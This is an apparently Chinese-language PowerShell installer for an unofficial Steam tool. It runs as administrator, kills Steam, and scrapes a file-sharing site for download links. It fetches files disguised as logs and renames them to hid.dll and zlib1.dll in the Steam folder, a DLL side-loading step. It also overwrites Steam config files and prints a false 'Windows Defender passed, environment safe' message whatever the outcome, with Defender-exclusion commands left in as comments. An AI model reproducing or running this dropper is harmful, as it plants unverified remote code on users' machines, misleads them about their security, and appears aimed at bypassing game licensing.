Clear-Host
#Requires -RunAsAdministrator
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = "SilentlyContinue"

Write-Host -NoNewline "STARTing...`r"

function Get-DownloadUrl
{
    param (
        [string]$fid,
        [string]$p = $null
    )
    $baseUrl = 'https://lanzoui.com'
    $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
    $content = $response.Content
    $iframeUrl = [regex]::Match($content, '<iframe class="ifr2" .*? src="(.*?)" .*?></iframe>').Groups[1].Value
    if ($iframeUrl)
    {
        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl$iframeUrl" -Headers @{ 'User-Agent' = '' } -Method Post
        $content = $response.Content
        $sign = [regex]::Match($content, "'sign':'(.*?)',").Groups[1].Value
    }
    else
    {
        $sign = [regex]::Match($content, "var skdklds = '(.*?)';").Groups[1].Value
    }
    if (-not$sign)
    {
        return
    }
    $urlMatch = [regex]::Match($content, "url : '(.*?)',").Groups[1].Value
    if (-not$urlMatch)
    {
        return
    }
    $headers = @{
        'User-Agent' = ''
        'Referer' = $response.BaseResponse.ResponseUri.AbsoluteUri
    }
    $body = @{ 'action' = 'downprocess'; 'sign' = $sign; 'kd' = 1 }
    if ($null -ne $p)
    {
        $body['p'] = $p
    }
    $response = Invoke-RestMethod -Uri "$baseUrl$urlMatch" -Headers $headers -Method Post -Body $body
    if ($null -eq $response)
    {
        return
    }
    $dom = $response.dom
    if (-not$dom)
    {
        return
    }
    $downloadUrl = $response.url
    if (-not$downloadUrl)
    {
        return
    }
    return "$dom/file/$downloadUrl"
}

try
{

    $filePathToDelete = "a.ps1"
    if (Test-Path $filePathToDelete)
    {
        Remove-Item -Path $filePathToDelete -Force
    }

    $targetDirectory = Join-Path $env:APPDATA "Stool"
    if (-not(Test-Path $targetDirectory))
    {
        New-Item -Path $targetDirectory -ItemType Directory | Out-Null
    }

    $savePathZip = Join-Path $targetDirectory "legit"
    if (Test-Path $savePathZip)
    {
        Remove-Item -Path $savePathZip -Force -ErrorAction Stop
    }

    Write-Host ""
    Write-Host ""
    Write-Host "  [STEAM] StarT进程准备中, 请稍候..."

    $steamRegPath = 'HKCU:\Software\Valve\Steam'
    $steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
    if ($null -eq $steamPath)
    {
        Write-Host "  [STEAM] Steam 可能没有正确安装，请重新安装 Steam 后再试" -ForegroundColor Red
        exit
    }
    $exePath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamExe').SteamExe
    $exePid = (Get-ItemProperty -Path ($steamRegPath + "\ActiveProcess") -Name 'pid').pid
    if ($null -ne $exePid)
    {
        Stop-Process -Id $exePid -ErrorAction SilentlyContinue
    }
    $registryPath = "HKCU:\Software\Valve\Steamtools"
    if (-not(Test-Path $registryPath))
    {
        New-Item -Path $registryPath -Force | Out-Null
    }
    Set-ItemProperty -Path $registryPath -Name "packageinfo" -Value "" | Out-Null

    $runningProcess = Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }
    $runningProcess | ForEach-Object {
        Stop-Process $_ -Force
    }

    if (-not$( [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') ))
    {
        Write-Host "  [STEAM] 请使用管理员模式运行" -ForegroundColor Red
    }


    $waitTimes = 10
    while (Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" })
    {
        Start-Sleep -Seconds 1
        $waitTimes--
        if ($waitTimes -lt 0)
        {
            break
        }
    }

    Write-Host -NoNewline "下载仅供网络安全研究使用, 你不应该从任何网络位置下载到本文件`r"

    $ProgressPreference = 'SilentlyContinue'
    Invoke-RestMethod -Uri (Get-DownloadUrl -fid 'ixWxW2l1ktmb') -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePathZip -ErrorAction Stop

    $savePathTxt = Join-Path $targetDirectory "winhttp-log.txt"
    $savePathTxt1 = Join-Path $targetDirectory "winhttp-log1.txt"

    if (Get-Service | where-object{ $_.name -eq "windefend" -and $_.status -eq "running" })
    {
        #            Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension 'exe', 'dll'
        #            Add-MpPreference -ExclusionPath $targetDirectory -ExclusionExtension 'exe', 'dll'
        Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
    }
    else
    {
        Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
    }

    $appCacheDirectory = Join-Path $steamPath "appcache"
    $savePathVdf = Join-Path $appCacheDirectory "appdata.vdf"

    if (-not(Test-Path $appCacheDirectory))
    {
        New-Item -Path $appCacheDirectory -ItemType Directory -ErrorAction Stop | Out-Null
    }
    elseif(Test-Path $savePathVdf)
    {
        Remove-Item -Path $savePathVdf -Force -ErrorAction Stop
    }

    $ProgressPreference = 'SilentlyContinue'
    Invoke-RestMethod -Uri (Get-DownloadUrl -fid 'ipxcE2l1ku9e') -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePathVdf -ErrorAction Stop

    $ProgressPreference = 'SilentlyContinue'
    Invoke-RestMethod -Uri (Get-DownloadUrl -fid 'ij16y2l1ku6b') -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePathTxt -ErrorAction Stop

    $ProgressPreference = 'SilentlyContinue'
    Invoke-RestMethod -Uri (Get-DownloadUrl -fid 'iXaxY2l1kubg') -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePathTxt1 -ErrorAction Stop

    foreach ($file in @("steam.cfg", "version.dll", "user32.dll"))
    {
        $filePath = Join-Path $steamPath $file
        if (Test-Path $filePath)
        {
            Remove-Item $filePath -Force
        }
    }

    $steamTxt = Join-Path $steamPath "hid.log"
    Move-Item -Path $savePathTxt -Destination $steamTxt -Force -ErrorAction Stop
    if (Test-Path $savePathTxt)
    {
        Remove-Item $savePathTxt -Force
    }

    $d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")
    if (Test-Path $d_path)
    {
        Remove-Item $d_path -Force -ErrorAction Stop
    }
    Rename-Item -Path $steamTxt -NewName $d_path -Force -ErrorAction Stop

    $steamTxt1 = Join-Path $steamPath "zlib1.log"
    Move-Item -Path $savePathTxt1 -Destination $steamTxt1 -Force -ErrorAction Stop
    if (Test-Path $savePathTxt1)
    {
        Remove-Item $savePathTxt1 -Force
    }

    $d_path1 = [System.IO.Path]::ChangeExtension($steamTxt1, ".dll")
    if (Test-Path $d_path1)
    {
        Remove-Item $d_path1 -Force -ErrorAction Stop
    }
    Rename-Item -Path $steamTxt1 -NewName $d_path1 -Force -ErrorAction Stop

    $loginUsersPath = Join-Path $steamPath "config\loginusers.vdf"
    if (Test-Path $loginUsersPath)
    {
        (Get-Content $loginUsersPath -Encoding UTF8) -replace '("WantsOfflineMode")\s*("\d+")', "`$1`t`t`"0`"" | Set-Content $loginUsersPath -Encoding UTF8
    }

    if (-not(Test-Path $exePath))
    {
        $exePath = Join-Path $steamPath "steam.exe"
    }

    if (Test-Path $exePath)
    {
        Invoke-Expression -Command "start steam://open/activateproduct"
    }
    else
    {
        Write-Host "  [STEAM] 主进程 $exePath 丢失，安装失败"
        exit
    }

    Write-Host "  [STEAM] StarT进程准备就绪，Steam 打开中，请稍候..."

    for ($i = 9; $i -ge 0; $i--) {
        Write-Host "`r  [STEAM] 本窗口将在 $i 秒后关闭..." -NoNewline
        Start-Sleep -Seconds 1
    }

    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
    while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe"))
    {
        $parentProcessId = $instance.ProcessId
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$( $instance.ParentProcessId )'"
    }
    if ($null -ne $parentProcessId)
    {
        Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
    }

    exit
}
catch
{
    Write-Host "发生错误：$( $_.Exception.Message )"
}